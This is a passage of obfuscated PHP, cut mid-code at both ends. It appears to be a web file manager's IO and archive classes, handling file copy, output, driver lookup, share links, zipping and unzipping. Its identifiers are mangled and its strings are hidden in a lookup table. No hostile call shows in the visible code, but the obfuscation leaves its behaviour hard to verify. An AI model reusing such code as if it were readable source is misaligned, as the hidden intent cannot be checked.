$Şğ÷”Õ¤->copyFile($èæ•äÇØ, $ç¼ò»¢); } Hook::trigger($ÚÀ£áâŠ[1293], $‘‘İÄ„, $èæ•äÇØ, $Şğ÷”Õ¤, $ç¼ò»¢, $­¾…‡Ìı, $çÆ„ÓÇÔ); self::copyMoveKeepInfo($‘‘İÄ„, $èæ•äÇØ, $çÆ„ÓÇÔ); return $çÆ„ÓÇÔ; } $¥„ì¯Ğ³ = TEMP_FILES; if ($GLOBALS[$ÚÀ£áâŠ[6]][$ÚÀ£áâŠ[92]][$ÚÀ£áâŠ[907]]) { $¥„ì¯Ğ³ = $GLOBALS[$ÚÀ£áâŠ[6]][$ÚÀ£áâŠ[92]][$ÚÀ£áâŠ[907]]; } $êŞ»‚È” = $¥„ì¯Ğ³; mk_dir($êŞ»‚È”); $›·Šƒ°ø = $êŞ»‚È” . $ÅòøçŸ; $ÔÊ¼ÌŠ = $›·Šƒ°ø; $›·Šƒ°ø = $‘‘İÄ„->download($èæ•äÇØ, $›·Šƒ°ø); $›·Šƒ°ø = $‘‘İÄ„->iconvApp($›·Šƒ°ø); if (substr($›·Šƒ°ø, strlen($¥„ì¯Ğ³)) == $¥„ì¯Ğ³) { $³–æĞÙ = !0; } $çÆ„ÓÇÔ = $Şğ÷”Õ¤->upload($ç¼ò»¢, $›·Šƒ°ø, $³–æĞÙ); self::remove($ÔÊ¼ÌŠ); Hook::trigger($ÚÀ£áâŠ[1293], $‘‘İÄ„, $èæ•äÇØ, $Şğ÷”Õ¤, $ç¼ò»¢, $­¾…‡Ìı, $çÆ„ÓÇÔ); self::copyMoveKeepInfo($‘‘İÄ„, $èæ•äÇØ, $çÆ„ÓÇÔ); return $çÆ„ÓÇÔ; } private static function copyMoveKeepInfo($·ü¥–Ë´, $Ô’¤›—‰, $é€ÊÑìÌ) { if (!$é€ÊÑìÌ) { return; } $Üâ»Ò±Ö = $·ü¥–Ë´->info($Ô’¤›—‰); if (!is_array($Üâ»Ò±Ö)) { return; } IO::setModifyTime($é€ÊÑìÌ, $Üâ»Ò±Ö[$_SERVER[‘ÆÜ‘œ][88]]); } public static function pathFather($À§ôù¥£) { $ôÂ±ÛÄõ = IO::init($À§ôù¥£); $²—Š·´Ş = $ôÂ±ÛÄõ->pathFather($ôÂ±ÛÄõ->path); return $ôÂ±ÛÄõ->getPathOuter($²—Š·´Ş); } public static function fileOut($¿áëªĞë, $†ñ´Ë› = false, $º·¹¨ = false, $‡ÜÈî¡ = '') { $ì·Áºıˆ = self::driverMake($¿áëªĞë); if ($ì·Áºıˆ->isFileOutServer()) { return $ì·Áºıˆ->fileOutServer($¿áëªĞë, $†ñ´Ë›, $º·¹¨, $‡ÜÈî¡); } return $ì·Áºıˆ->fileOut($¿áëªĞë, $†ñ´Ë›, $º·¹¨, $‡ÜÈî¡); } public static function fileOutImage($ˆÄä¼ÓÎ, $ƒş‹Ö±Ö = 250) { $Ù”Â¥Éì = array(250, 600, 1200, 2000, 3000, 5000); for ($ú’ï£€× = 0; $ú’ï£€× < count($Ù”Â¥Éì); $ú’ï£€×++) { if ($ú’ï£€× == 0 && $ƒş‹Ö±Ö <= $Ù”Â¥Éì[$ú’ï£€×]) { $ƒş‹Ö±Ö = $Ù”Â¥Éì[$ú’ï£€×]; break; } else { if ($ƒş‹Ö±Ö > $Ù”Â¥Éì[$ú’ï£€× - 1] && $ƒş‹Ö±Ö <= $Ù”Â¥Éì[$ú’ï£€×]) { $ƒş‹Ö±Ö = $Ù”Â¥Éì[$ú’ï£€×]; break; } else { if ($ú’ï£€× == count($Ù”Â¥Éì) - 1 && $ƒş‹Ö±Ö > $Ù”Â¥Éì[$ú’ï£€×]) { $ƒş‹Ö±Ö = $Ù”Â¥Éì[$ú’ï£€×]; break; } } } } $ªíò¯» = self::driverMake($ˆÄä¼ÓÎ); if ($ªíò¯»->isFileOutServer()) { return $ªíò¯»->fileOutImageServer($ˆÄä¼ÓÎ, $ƒş‹Ö±Ö); } return $ªíò¯»->fileOutImage($ˆÄä¼ÓÎ, $ƒş‹Ö±Ö); } private static function driverIsSame($•°€„†Ş, $Ü’éô­) { $éì¦î½‡ =& $_SERVER[‘ÆÜ‘œ]; $óÂ˜«ôĞ = $•°€„†Ş->getType(); $ù“Œ¸†À = $Ü’éô­->getType(); if ($óÂ˜«ôĞ != $ù“Œ¸†À) { return !1; } if ($óÂ˜«ôĞ == $éì¦î½‡[865]) { return !0; } if ($óÂ˜«ôĞ == $éì¦î½‡[107]) { return !0; } if ($•°€„†Ş->pathDriver == $Ü’éô­->pathDriver) { return !0; } return !1; } public static function copyUpdate($²Ò§—­Å, $Ê‰ö­±Ó) { $‚¶ó›¡Ç =& $_SERVER[‘ÆÜ‘œ]; if (!IO::exist($²Ò§—­Å)) { return !1; } if (!IO::exist($Ê‰ö­±Ó)) { IO::mkdir($Ê‰ö­±Ó); } $Áôè§Ø = array_to_keyvalue(self::listAllSimple($²Ò§—­Å), $‚¶ó›¡Ç[87]); $¨ªê´î¡ = array_to_keyvalue(self::listAllSimple($Ê‰ö­±Ó), $‚¶ó›¡Ç[87]); $øèè¢÷ = array(); $£Ï±À©„ = array(); foreach ($Áôè§Ø as $Ïüç·¸» => $ÚäæÂî) { if (isset($¨ªê´î¡[$Ïüç·¸»])) { if ($ÚäæÂî[$‚¶ó›¡Ç[78]] == 1) { continue; } if ($¨ªê´î¡[$Ïüç·¸»][$‚¶ó›¡Ç[79]] == $ÚäæÂî[$‚¶ó›¡Ç[79]]) { continue; } } if ($ÚäæÂî[$‚¶ó›¡Ç[78]] == 1) { $£Ï±À©„[] = $Ê‰ö­±Ó . $‚¶ó›¡Ç[8] . trim($Ïüç·¸», $‚¶ó›¡Ç[8]); continue; } $Œøšãƒ = strstr(trim($Ïüç·¸», $‚¶ó›¡Ç[8]), $‚¶ó›¡Ç[8]) ? get_path_father($Ïüç·¸») : $‚¶ó›¡Ç[12]; $øèè¢÷[] = array($‚¶ó›¡Ç[1294] => $ÚäæÂî[$‚¶ó›¡Ç[89]], $‚¶ó›¡Ç[1295] => rtrim($Ê‰ö­±Ó, $‚¶ó›¡Ç[8]) . $‚¶ó›¡Ç[8] . $Œøšãƒ, $‚¶ó›¡Ç[1296] => $ÚäæÂî); } $¨àááó¶ = array($‚¶ó›¡Ç[231] => $øèè¢÷, $‚¶ó›¡Ç[78] => $£Ï±À©„); Hook::trigger($‚¶ó›¡Ç[1297], $²Ò§—­Å, $Ê‰ö­±Ó, $¨àááó¶); foreach ($£Ï±À©„ as $ÚäæÂî) { IO::mkdir($ÚäæÂî); } foreach ($øèè¢÷ as $ÚäæÂî) { IO::copy($ÚäæÂî[$‚¶ó›¡Ç[1294]], $ÚäæÂî[$‚¶ó›¡Ç[1295]], REPEAT_REPLACE); } } public static function fileSubstr($Ü›Áàù, $’ô®û, $›ìÆÕ· = false) { $êüÑâä¸ =& $_SERVER[‘ÆÜ‘œ]; $„ş€É££ = self::driverMake($Ü›Áàù); $ş¸Š = $„ş€É££->size($Ü›Áàù); $ˆÖÑØ±ã = $’ô®û; $‹¾€§× = $›ìÆÕ·; if ($’ô®û < 0) { $’ô®û = $ş¸Š + $’ô®û; } if ($›ìÆÕ· === !1) { $›ìÆÕ· = $ş¸Š - $’ô®û; } if ($’ô®û + $›ìÆÕ· > $ş¸Š) { $›ìÆÕ· = $ş¸Š - $’ô®û; } if (!$ş¸Š && $„ş€É££->getType() == $êüÑâä¸[107] && !$„ş€É££->exist($Ü›Áàù)) { $ÜÖ¤ñø = get_path_this($Ü›Áàù); $±¼§âÁ¢ = parse_url_query($ÜÖ¤ñø); if (is_array($±¼§âÁ¢) && isset($±¼§âÁ¢[$êüÑâä¸[32]])) { $ÜÖ¤ñø = urldecode($±¼§âÁ¢[$êüÑâä¸[32]]); } throw new Exception($êüÑâä¸[1298] . LNG($êüÑâä¸[1299]) . $êüÑâä¸[1084] . clear_html($ÜÖ¤ñø) . $êüÑâä¸[12]); } if ($›ìÆÕ· <= 0) { return $êüÑâä¸[12]; } if ($’ô®û < 0 || $’ô®û >= $ş¸Š || $›ìÆÕ· > $GLOBALS[$êüÑâä¸[6]][$êüÑâä¸[92]][$êüÑâä¸[1300]]) { throw new Exception("\146\151\x6c\x65\122\x65\x61\x64\x20\145\162\x72\x6f\x72\x2c\157\166\145\x72\40\x69\157\x52\145\x61\x64\x4d\141\x78\41\40\163\x74\x61\x72\164\75{$’ô®û}\73\154\145\x6e\x67\x74\150\75{$›ìÆÕ·}\x3b\x20\163\x69\172\x65\x3d{$ş¸Š}\x3b"); } $¯´³åÈÄ = $„ş€É££->fileSubstr($Ü›Áàù, $’ô®û, $›ìÆÕ·); if (!$¯´³åÈÄ && $›ìÆÕ· && isset($GLOBALS[$êüÑâä¸[1301]])) { throw new Exception($GLOBALS[$êüÑâä¸[1301]][$êüÑâä¸[1302]]); } return $¯´³åÈÄ; } private static function driverMake(&$§”¶‚­) { $´ Ú“áƒ =& $_SERVER[‘ÆÜ‘œ]; $Ä­áêè = KodIO::parse($§”¶‚­); if (!self::$driverListSystem) { $ö¹û¼¢‡ = Model($´ Ú“áƒ[875])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ö¹û¼¢‡, $´ Ú“áƒ[495]); } if ($Ä­áêè[$´ Ú“áƒ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ä­áêè[$´ Ú“áƒ[495]]]) { throw new Exception($´ Ú“áƒ[1303]); return !1; } $§”¶‚­ = $Ä­áêè[$´ Ú“áƒ[1304]]; $Ù¾¶¬½” = self::driverGet($Ä­áêè, $§”¶‚­); return $Ù¾¶¬½”; } private static function driverGet($˜ÉËè®, &$íîÑŸÕŒ) { $˜İş›–† =& $_SERVER[‘ÆÜ‘œ]; $ÚâıíÓ = $˜ÉËè®[$˜İş›–†[1305]]; $äµÖÔÒï = $˜ÉËè®[$˜İş›–†[495]]; switch ($˜ÉËè®[$˜İş›–†[33]]) { case KodIO::KOD_IO: $Ë¢Ù¨æ = self::$driverListSystem[$äµÖÔÒï]; break; case KodIO::KOD_SOURCE: $íîÑŸÕŒ = $äµÖÔÒï . $íîÑŸÕŒ; $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1307], $˜İş›–†[6] => $˜ÉËè®); $Ë¢Ù¨æ[$˜İş›–†[6]][$˜İş›–†[1308]] = $˜ÉËè®[$˜İş›–†[495]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $„³Å®£Œ = $GLOBALS[$˜İş›–†[1309]]; self::$driverListUser = array_to_keyvalue($„³Å®£Œ, $˜İş›–†[495]); } $Ë¢Ù¨æ = self::$driverListUser[$äµÖÔÒï]; break; case KodIO::KOD_SHARE_LINK: $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1310], $˜İş›–†[6] => $˜ÉËè®); $Ñ‹›Ÿ±• = Action($˜İş›–†[1311])->sharePathInfo($˜ÉËè®[$˜İş›–†[87]]); $íîÑŸÕŒ = $Ñ‹›Ÿ±•[$˜İş›–†[192]]; if (!$Ñ‹›Ÿ±•[$˜İş›–†[192]]) { $¾üÄáú = Model($˜İş›–†[694])->getInfoByHash($˜ÉËè®[$˜İş›–†[495]]); $íîÑŸÕŒ = KodIO::clear($¾üÄáú[$˜İş›–†[591]] . $˜ÉËè®[$˜İş›–†[1304]]); $˜ÉËè®[$˜İş›–†[584]] = $¾üÄáú; $˜ÉËè®[$˜İş›–†[1285]] = $íîÑŸÕŒ; $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1312], $˜İş›–†[6] => $˜ÉËè®); } else { $Ë¢Ù¨æ[$˜İş›–†[6]][$˜İş›–†[1308]] = $Ñ‹›Ÿ±•[$˜İş›–†[192]]; } break; case KodIO::KOD_SHARE_ITEM: $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1313], $˜İş›–†[6] => $˜ÉËè®); $¾üÄáú = Model($˜İş›–†[694])->getInfo($˜ÉËè®[$˜İş›–†[495]]); if ($¾üÄáú[$˜İş›–†[192]] == $˜İş›–†[229]) { $íîÑŸÕŒ = KodIO::clear($¾üÄáú[$˜İş›–†[591]] . $˜ÉËè®[$˜İş›–†[1304]]); $˜ÉËè®[$˜İş›–†[584]] = $¾üÄáú; $˜ÉËè®[$˜İş›–†[1285]] = $íîÑŸÕŒ; $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1314], $˜İş›–†[6] => $˜ÉËè®); } else { if (!$íîÑŸÕŒ) { $íîÑŸÕŒ = $¾üÄáú[$˜İş›–†[192]]; } $Ë¢Ù¨æ[$˜İş›–†[6]][$˜İş›–†[1308]] = $¾üÄáú[$˜İş›–†[192]]; } break; case KodIO::KOD_SHARE_OUTER: $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1315], $˜İş›–†[6] => $˜ÉËè®); break; default: $íîÑŸÕŒ = $˜ÉËè®[$˜İş›–†[87]]; $Ë¢Ù¨æ = array($˜İş›–†[1306] => $˜İş›–†[1316]); break; } $ÏËªÒú = $˜ÉËè®[$˜İş›–†[87]]; if (!isset(self::$driverCache[$ÏËªÒú])) { $ß·œƒó = strtolower($Ë¢Ù¨æ[$˜İş›–†[96]]); $±²‚œ•å = $GLOBALS[$˜İş›–†[6]][$˜İş›–†[92]][$˜İş›–†[940]]; $Šğ¥ıÒÑ = $˜İş›–†[77] . (isset($±²‚œ•å[$ß·œƒó]) ? $±²‚œ•å[$ß·œƒó] : ucfirst($ß·œƒó)); if (!class_exists($Šğ¥ıÒÑ)) { show_json("{$Šğ¥ıÒÑ}\40\156\x6f\x74\x20\145\170\151\x73\x74\x73\x21", !1); } $µûÓÙ’± = isset($Ë¢Ù¨æ[$˜İş›–†[6]]) ? $Ë¢Ù¨æ[$˜İş›–†[6]] : !1; self::$driverCache[$ÏËªÒú] = new $Šğ¥ıÒÑ($µûÓÙ’±); } $ƒœü©¹€ = self::$driverCache[$ÏËªÒú]; $ƒœü©¹€->pathDriver = $ÚâıíÓ; $ƒœü©¹€->pathBase = $˜İş›–†[12]; if (isset($Ë¢Ù¨æ[$˜İş›–†[6]][$˜İş›–†[1317]])) { $ƒœü©¹€->pathBase = rtrim($Ë¢Ù¨æ[$˜İş›–†[6]][$˜İş›–†[1317]], $˜İş›–†[8]) . $˜İş›–†[8]; $íîÑŸÕŒ = $ƒœü©¹€->pathBase . ltrim($íîÑŸÕŒ, $˜İş›–†[8]); } $íîÑŸÕŒ = $ƒœü©¹€->getPath($íîÑŸÕŒ); if (isset($˜ÉËè®[$˜İş›–†[1285]])) { $íîÑŸÕŒ = $˜ÉËè®[$˜İş›–†[1285]]; } $ƒœü©¹€->path = $íîÑŸÕŒ; return $ƒœü©¹€; } public static function errorTips($Ã‡î§» = false, $¨’ˆáÒ¨ = true) { $³¤ÁşŠ =& $_SERVER[‘ÆÜ‘œ]; static $§ê¡·íñ = array(); $‘±Šö…Ó = 100; if ($Ã‡î§» === -1) { return $§ê¡·íñ ? $§ê¡·íñ[count($§ê¡·íñ) - 1] : $³¤ÁşŠ[12]; } if ($Ã‡î§» === !1) { return implode($³¤ÁşŠ[286], $§ê¡·íñ); } if (count($§ê¡·íñ) >= $‘±Šö…Ó) { $§ê¡·íñ = array_slice($§ê¡·íñ, $‘±Šö…Ó * 0.5, $‘±Šö…Ó); } $§ê¡·íñ[] = $Ã‡î§»; if (!$¨’ˆáÒ¨) { return; } write_log($³¤ÁşŠ[174] . ACTION . $³¤ÁşŠ[1318] . $Ã‡î§», $³¤ÁşŠ[1319]); } public static function getLastError($ŒÂ‡ªˆö = '') { $èîÌæ«É = self::errorTips(-1); return $èîÌæ«É ? $èîÌæ«É : $ŒÂ‡ªˆö; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $àÊù—ô¥; if ($àÊù—ô¥) { return $àÊù—ô¥; } $Öâƒ¢‚¼ = IO::init($_SERVER[‘ÆÜ‘œ][8]); return $Öâƒ¢‚¼; } private static function iconvSystem($Î²èæ¤Ä) { return self::local()->iconvSystem($Î²èæ¤Ä); } private static function iconvApp($¬±«Æü) { return self::local()->iconvApp($¬±«Æü); } public static function zipFolder($—ßÔŒİ, $†İ—ì½‡ = "\x7a\x69\160", $à¾İÔ›Ä = '', $‚‘Ç‘Åö = REPEAT_RENAME) { $›˜Ñò¦» =& $_SERVER[‘ÆÜ‘œ]; $ƒ¿·÷Åñ = IO::listPath($—ßÔŒİ); if (!$ƒ¿·÷Åñ) { return !1; } $ƒ¿·÷Åñ = array_merge($ƒ¿·÷Åñ[$›˜Ñò¦»[85]], $ƒ¿·÷Åñ[$›˜Ñò¦»[86]]); return self::zip($ƒ¿·÷Åñ, $†İ—ì½‡, $à¾İÔ›Ä, $‚‘Ç‘Åö); } public static function zip($ˆÉ÷Â÷Ï, $Ê´›Ñë = "\x7a\x69\x70", $’ûøúü› = '', $»û•Çğ¿ = REPEAT_RENAME) { $®ˆ¥—ä =& $_SERVER[‘ÆÜ‘œ]; if (is_string($ˆÉ÷Â÷Ï) && $ˆÉ÷Â÷Ï) { $ˆÉ÷Â÷Ï = array(array($®ˆ¥—ä[87] => $ˆÉ÷Â÷Ï)); } $’–¡îò = self::init($ˆÉ÷Â÷Ï[0][$®ˆ¥—ä[87]]); $“ïìÅğÄ = self::info($ˆÉ÷Â÷Ï[0][$®ˆ¥—ä[87]]); $¿¼”ï¾ = $®ˆ¥—ä[12]; $¹ôÌÜ… = $®ˆ¥—ä[12]; $½–„²§ = $®ˆ¥—ä[12]; if ($’ûøúü› && substr($’ûøúü›, -1, 1) != $®ˆ¥—ä[8]) { $¹ôÌÜ… = get_path_father($’ûøúü›); $½–„²§ = get_path_this($’ûøúü›); } else { $¹ôÌÜ… = self::pathFather($“ïìÅğÄ[$®ˆ¥—ä[87]]); $½–„²§ = $“ïìÅğÄ[$®ˆ¥—ä[32]] . $®ˆ¥—ä[10] . $Ê´›Ñë; if (count($ˆÉ÷Â÷Ï) > 1) { $®Ì™Ò = IO::info($¹ôÌÜ…); $½–„²§ = $®Ì™Ò[$®ˆ¥—ä[32]] . $®ˆ¥—ä[10] . $Ê´›Ñë; } if ($’ûøúü›) { $¹ôÌÜ… = $’ûøúü›; } } if ($’–¡îò->getType() == $®ˆ¥—ä[107]) { $š¨Û•ô¸ = self::init($¹ôÌÜ…); $ººÛ—¤  = $š¨Û•ô¸->getType() == $®ˆ¥—ä[107] ? $¹ôÌÜ… : get_path_father($’–¡îò->path); $ººÛ—¤  = IO::getPathInner($ººÛ—¤ ); $ººÛ—¤  = rtrim($ººÛ—¤ , $®ˆ¥—ä[8]) . $®ˆ¥—ä[8]; mk_dir($ººÛ—¤ ); } else { $¿¼”ï¾ = TEMP_FILES . $®ˆ¥—ä[1320] . time() . rand_string(8) . $®ˆ¥—ä[8]; mk_dir($¿¼”ï¾); file_put_contents($¿¼”ï¾ . $®ˆ¥—ä[1321], $®ˆ¥—ä[12]); $ººÛ—¤  = $¿¼”ï¾; } $İí‰Ö‹€ = IO::info($ººÛ—¤ ); if (!$İí‰Ö‹€ || !$İí‰Ö‹€[$®ˆ¥—ä[234]]) { show_json(LNG($®ˆ¥—ä[1322]), !1); } $êóÕ‚À’ = self::zipFileList($ˆÉ÷Â÷Ï, $¿¼”ï¾); foreach ($êóÕ‚À’ as $Å¶ÏÊ©¤ => $ÉÁıœé¨) { $êóÕ‚À’[$Å¶ÏÊ©¤] = self::iconvSystem($ÉÁıœé¨); } $˜éÊ—µ = get_filename_auto($ººÛ—¤  . $½–„²§, $®ˆ¥—ä[12], $»û•Çğ¿); KodArchive::create(self::iconvSystem($˜éÊ—µ), $êóÕ‚À’); if (!IO::exist($˜éÊ—µ)) { if ($¿¼”ï¾) { del_dir($¿¼”ï¾); } write_log($®ˆ¥—ä[1323] . $˜éÊ—µ, $®ˆ¥—ä[398]); show_json(LNG($®ˆ¥—ä[1324]), !1); } if (!$¿¼”ï¾) { return $˜éÊ—µ; } $ôÖ†„Ù— = self::move($˜éÊ—µ, $¹ôÌÜ…, $»û•Çğ¿); if ($¿¼”ï¾) { del_dir($¿¼”ï¾); } if (!$˜éÊ—µ) { write_log($®ˆ¥—ä[1325] . $˜éÊ—µ . $®ˆ¥—ä[1326] . $¹ôÌÜ…, $®ˆ¥—ä[398]); show_json(LNG($®ˆ¥—ä[1324]), !1); } return $ôÖ†„Ù—; } public static function unzip($øÉÈ, $Ğ·³§›À, $ÜÚÙÀµ¾ = "\x2d\61", $ß†à¸™Ç = "\162\x65\x70\154\141\143\x65") { $Ê¥©ú¾é =& $_SERVER[‘ÆÜ‘œ]; $Êº”“•  = parent::info($øÉÈ); if (!$Êº”“• ) { show_json(LNG($Ê¥©ú¾é[1327]), !1); } $ùéÆ÷¹Ó = IO::infoFullSimple($Ğ·³§›À); if (!$ùéÆ÷¹Ó) { $Ğ·³§›À = IO::mkdir($Ğ·³§›À); } if (isset($ùéÆ÷¹Ó[$Ê¥©ú¾é[192]]) && trim($ùéÆ÷¹Ó[$Ê¥©ú¾é[87]], $Ê¥©ú¾é[8]) != trim($Ğ·³§›À, $Ê¥©ú¾é[8])) { $ÆùÚÔø™ = KodIO::make($ùéÆ÷¹Ó[$Ê¥©ú¾é[191]]); $Õ³Ññ = IO::fileNameAuto($ÆùÚÔø™, $ùéÆ÷¹Ó[$Ê¥©ú¾é[32]], REPEAT_RENAME_FOLDER, !0); $Ğ·³§›À = IO::mkdir($ÆùÚÔø™ . $Õ³Ññ); } $ÜÚÙÀµ¾ = $ÜÚÙÀµ¾ && $ÜÚÙÀµ¾ != $Ê¥©ú¾é[1328] ? @json_decode($ÜÚÙÀµ¾, !0) : -1; $¸Œ«Óş– = self::unzipPart($øÉÈ, $ÜÚÙÀµ¾); if (!$¸Œ«Óş– || !IO::exist($¸Œ«Óş–[$Ê¥©ú¾é[231]])) { show_json(LNG($Ê¥©ú¾é[106]), !1); } $ÙÚè¦¢“ = $¸Œ«Óş–[$Ê¥©ú¾é[1329]][count($¸Œ«Óş–[$Ê¥©ú¾é[1329]]) - 1]; if ($ÙÚè¦¢“[$Ê¥©ú¾é[1257]] == -1 || substr($ÙÚè¦¢“[$Ê¥©ú¾é[32]], -1, 1) == $Ê¥©ú¾é[8]) { $—ÊÕô¢Ù = $¸Œ«Óş–[$Ê¥©ú¾é[1330]] . rand_string(10) . $Ê¥©ú¾é[8]; mk_dir($—ÊÕô¢Ù); $Ãı×‘ı½ = count($¸Œ«Óş–[$Ê¥©ú¾é[1329]]) == 1 ? IO::ext($øÉÈ) : get_path_ext($¸Œ«Óş–[$Ê¥©ú¾é[231]]); $ÕÔÙÜšš = KodArchive::extract(self::iconvSystem($¸Œ«Óş–[$Ê¥©ú¾é[231]]), $—ÊÕô¢Ù, $ÙÚè¦¢“[$Ê¥©ú¾é[1257]], $Õ³Ññ, $Ãı×‘ı½); self::unzipErrorCheck($ÕÔÙÜšš, array($Ê¥©ú¾é[1331], $øÉÈ, $Ãı×‘ı½, $Ğ·³§›À, $¸Œ«Óş–)); Hook::trigger($Ê¥©ú¾é[1332], $—ÊÕô¢Ù); recursion_dir($—ÊÕô¢Ù, $ÎâØ¨Ğ, $«ÔËÚ½ë, 0); $ü÷š‘àÌ = array_merge($ÎâØ¨Ğ, $«ÔËÚ½ë); $Í•ºèÈ = array(); foreach ($ü÷š‘àÌ as $úş¸ï¹) { $ŸÜ¡ğÙş = IO::move(self::iconvApp($úş¸ï¹), $Ğ·³§›À, $ß†à¸™Ç); if ($ŸÜ¡ğÙş) { $Í•ºèÈ[] = $ŸÜ¡ğÙş; } } del_dir($—ÊÕô¢Ù); } else { $ŸÜ¡ğÙş = IO::move($¸Œ«Óş–[$Ê¥©ú¾é[231]], $Ğ·³§›À, $ß†à¸™Ç, get_path_this($ÙÚè¦¢“[$Ê¥©ú¾é[32]])); if ($ŸÜ¡ğÙş) { $Í•ºèÈ[] = $ŸÜ¡ğÙş; } } return $Í•ºèÈ ? $Í•ºèÈ : !1; } public static function unzipList($ë¥ºá¾¸) { $•é¦œ¨Ñ =& $_SERVER[‘ÆÜ‘œ]; $ªÏäè‹ = isset($ë¥ºá¾¸[$•é¦œ¨Ñ[1333]]) ? $ë¥ºá¾¸[$•é¦œ¨Ñ[1333]] : !1; $ÄŒ­ˆ– = isset($ë¥ºá¾¸[$•é¦œ¨Ñ[1257]]) ? @json_decode($ë¥ºá¾¸[$•é¦œ¨Ñ[1257]], !0) : -1; $¯»î½şÙ = self::unzipPart($ë¥ºá¾¸[$•é¦œ¨Ñ[87]], $ÄŒ­ˆ–); if (!$¯»î½şÙ || !IO::exist($¯»î½şÙ[$•é¦œ¨Ñ[231]])) { show_json(LNG($•é¦œ¨Ñ[106]), !1); } $È¦äùí = $¯»î½şÙ[$•é¦œ¨Ñ[1329]][count($¯»î½şÙ[$•é¦œ¨Ñ[1329]]) - 1]; $ÕùÖœü = in_array(IO::ext($¯»î½şÙ[$•é¦œ¨Ñ[231]]), array($•é¦œ¨Ñ[398], $•é¦œ¨Ñ[1334], $•é¦œ¨Ñ[1335], $•é¦œ¨Ñ[1336], $•é¦œ¨Ñ[1337], $•é¦œ¨Ñ[1338])); if (!$ªÏäè‹ && ($È¦äùí[$•é¦œ¨Ñ[1257]] == -1 || $ÕùÖœü)) { $ÚåğÁ¡´ = $¯»î½şÙ[$•é¦œ¨Ñ[1330]] . get_path_this($¯»î½şÙ[$•é¦œ¨Ñ[231]]) . $•é¦œ¨Ñ[1339]; if (!IO::exist($ÚåğÁ¡´)) { $õ—²Ó¶ê = $È¦äùí[$•é¦œ¨Ñ[1257]] == -1 ? get_path_ext(IO::pathThis($ë¥ºá¾¸[$•é¦œ¨Ñ[87]])) : get_path_ext($¯»î½şÙ[$•é¦œ¨Ñ[231]]); $‰¥ï¡Å˜ = KodArchive::listContent(self::iconvSystem($¯»î½şÙ[$•é¦œ¨Ñ[231]]), !0, $õ—²Ó¶ê); self::unzipErrorCheck($‰¥ï¡Å˜, array($•é¦œ¨Ñ[1340], $ë¥ºá¾¸, $¯»î½şÙ)); @file_put_contents($ÚåğÁ¡´, json_encode($‰¥ï¡Å˜[$•é¦œ¨Ñ[1341]])); } return @json_decode(IO::getContent($ÚåğÁ¡´), !0); } IO::fileOut($¯»î½şÙ[$•é¦œ¨Ñ[231]], $ªÏäè‹, get_path_this($È¦äùí[$•é¦œ¨Ñ[32]])); die; } private static function zipFileList($áÑ·®†‹, $ôÌğÛ´™ = false) { $¯Öˆ– =& $_SERVER[‘ÆÜ‘œ]; $øæŒ®Åé = array(); foreach ($áÑ·®†‹ as $±šŸƒ£÷) { $îøÍ¯¦ = $±šŸƒ£÷[$¯Öˆ–[87]]; if ($ôÌğÛ´™) { $îøÍ¯¦ = self::copy($±šŸƒ£÷[$¯Öˆ–[87]], $ôÌğÛ´™, $¯Öˆ–[933]); } else { $£µ‡ñö = self::init($±šŸƒ£÷[$¯Öˆ–[87]]); if ($£µ‡ñö->getType() == $¯Öˆ–[107]) { $îøÍ¯¦ = $£µ‡ñö->path; } } if ($îøÍ¯¦ && self::local()->exist($îøÍ¯¦)) { $øæŒ®Åé[$±šŸƒ£÷[$¯Öˆ–[87]]] = $îøÍ¯¦; } } if (!empty($øæŒ®Åé)) { return array_values($øæŒ®Åé); } show_json(LNG($¯Öˆ–[1299]), !1); } private static function localFilePath($ùœŸ®üí) { $ˆŸ÷›ªä =& $_SERVER[‘ÆÜ‘œ]; $ô€ˆüê¡ = KodIO::parse($ùœŸ®üí); if ($ô€ˆüê¡[$ˆŸ÷›ªä[33]] == KodIO::KOD_SOURCE) { $çãˆ±È³ = Model($ˆŸ÷›ªä[939])->fileInfoGet(KodIO::sourceID($ùœŸ®üí)); if (!$çãˆ±È³[$ˆŸ÷›ªä[87]]) { show_json($ˆŸ÷›ªä[1342], !1); } $ùœŸ®üí = $çãˆ±È³[$ˆŸ÷›ªä[87]]; } $•á—ò‘ä = self::init($ùœŸ®üí); if ($•á—ò‘ä->pathParse[$ˆŸ÷›ªä[1285]]) { $ùœŸ®üí = $•á—ò‘ä->pathParse[$ˆŸ÷›ªä[1285]]; $•á—ò‘ä = self::init($ùœŸ®üí); } $Û”ÌÇŞ = $•á—ò‘ä->getType(); if ($Û”ÌÇŞ == $ˆŸ÷›ªä[107] || $Û”ÌÇŞ == $ˆŸ÷›ªä[1343]) { if (!$•á—ò‘ä->exist($•á—ò‘ä->path)) { show_json(LNG($ˆŸ÷›ªä[106]), !1); } return $•á—ò‘ä->path; } return !1; } public static function unzipPart($»ŞÙÂÇä, $Œè¯­øÎ = -1) { $íÒ»—÷ï =& $_SERVER[‘ÆÜ‘œ]; $•‰Ã•¨– = IO::pathThis($»ŞÙÂÇä); if (!$Œè¯­øÎ || $Œè¯­øÎ == -1) { $Ú·µš˜Î = array(array($íÒ»—÷ï[32] => $•‰Ã•¨–, $íÒ»—÷ï[1257] => -1)); $Ú·µš˜Î[0][$íÒ»—÷ï[1344]] = $Ú·µš˜Î[0][$íÒ»—÷ï[32]]; } else { if (is_array($Œè¯­øÎ)) { $Ú·µš˜Î = $Œè¯­øÎ; $£çä°º = count($Ú·µš˜Î) - 1; for ($àÕ©à§â = 0; $àÕ©à§â <= $£çä°º; $àÕ©à§â++) { $ĞàŠú¹— = $Ú·µš˜Î[$àÕ©à§â]; $¬ºÜËõÆ = get_path_this($ĞàŠú¹—[$íÒ»—÷ï[32]]) . (checkExtSafe($ĞàŠú¹—[$íÒ»—÷ï[32]]) ? $íÒ»—÷ï[12] : $íÒ»—÷ï[1345]); $Ú·µš˜Î[$àÕ©à§â][$íÒ»—÷ï[1344]] = $íÒ»—÷ï[1346] . 